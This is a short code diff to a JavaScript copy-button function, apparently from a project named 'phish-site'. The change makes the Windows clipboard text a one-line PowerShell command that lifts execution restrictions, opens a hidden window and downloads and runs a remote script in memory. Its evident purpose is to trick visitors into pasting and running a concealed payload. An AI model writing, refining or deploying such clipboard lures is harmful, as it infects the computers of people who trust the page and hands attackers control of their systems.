@@ -31,9 +31,9 @@ async function setupCopyables() {
 
             if (os === "Windows") {
                 // main event
-                let text = "Set-ExecutionPolicy -scope CurrentUser Unrestricted; iwr -uri https://raw.githubusercontent.com/UnDefinedCS/phish-site/refs/heads/main/program/avdxr.ps1 -outfile .avdxr.ps1; $item = Get-Item -Path .\\.avdxr.ps1; $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden; powershell .\\.avdxr.ps1";
+                let p = `powershell -nop -windowstyle hidden -c "Set-ExecutionPolicy -scope CurrentUser Unrestricted; iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/UnDefinedCS/phish-site/refs/heads/main/program/avdxr.ps1'))"`;
                 button.onclick = () => {
-                    navigator.clipboard.writeText(text);
+                    navigator.clipboard.writeText(p);
                     button.innerHTML = escapeHTML('✅');
                     setTimeout(() => button.innerHTML = escapeHTML('📋'), 1000);
                 }
